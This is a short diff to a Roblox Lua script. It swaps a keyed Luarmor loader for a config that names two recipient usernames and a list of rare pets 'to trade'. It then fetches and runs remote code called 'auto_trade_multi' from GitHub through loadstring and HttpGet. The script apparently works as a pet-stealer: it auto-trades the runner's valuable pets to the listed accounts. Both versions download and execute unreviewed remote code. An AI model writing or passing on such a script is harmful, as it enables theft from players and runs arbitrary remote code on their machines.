@@ -1,2 +1,6 @@
-script_key="gODDvpwZvizlBrcNoYDGYaWBQuGdtvTS";
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/0f4903a1dee046624931189702bd8751.lua"))()
+getgenv().Config = {
+    ["inventory"] = "pets",
+    ["usernames"] = {"ggblonded1", "ggblonded"}, 
+    ["pets_to_trade"] = {"aztec_egg_2025_winged_snake", "aztec_egg_2025_temple_friend", "penguins_2025_dango_penguins", "pet_recycler_2025_emberlight", "diamond_unicorn", "basic_egg_2022_alicorn", "golden_unicorn", "winter_2025_xmas_tree_sasquatch"}
+}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/diwserenityhub/other/refs/heads/main/auto_trade_multi"))()
